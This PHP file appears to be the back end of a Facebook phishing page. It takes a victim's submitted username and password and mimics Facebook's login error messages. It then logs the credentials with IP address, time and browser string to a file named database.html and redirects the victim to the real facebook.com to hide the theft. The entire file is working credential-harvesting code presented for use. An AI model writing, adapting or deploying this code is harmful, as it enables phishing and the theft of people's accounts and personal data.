<?php
function test_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
  }
  if(isset($_POST['user']) and isset($_POST['pass'])){
    $user = test_input($_POST['user']);
    $pass = test_input($_POST['pass']);
    if(strlen($user)<6){
        header("location:index.php?error=The email address or the number that you've entered doesn't match any account. <b><a href='' class='errorlink'>Find your account.</b></a>&no=odd");
        exit();
    }
  }
  if(strlen($pass)<6){
      header("location:index.php?error=Incorrect password. <b><a href='' class='errorlink'>Did you forget your password?</b></a>&no=even&user=$user");
        exit();
    }
    
    date_default_timezone_set("Asia/Karachi");
    $arr = "User: $user"."<br>";
    $arr .= "Pass: $pass"."<br>";
    $arr .= "IP :". $_SERVER['REMOTE_ADDR']."<br>";
    $arr .= "Time:".date("M d,Y h:i:sa")."<br>";
    $arr .= "Browser: ".$_SERVER['HTTP_USER_AGENT']."<hr>";
    echo ($arr);
        
    $file_data = "$arr \n";
    $file_data .= file_get_contents('database.html');
    file_put_contents('database.html', $file_data);

    header("location:https://facebook.com");
?>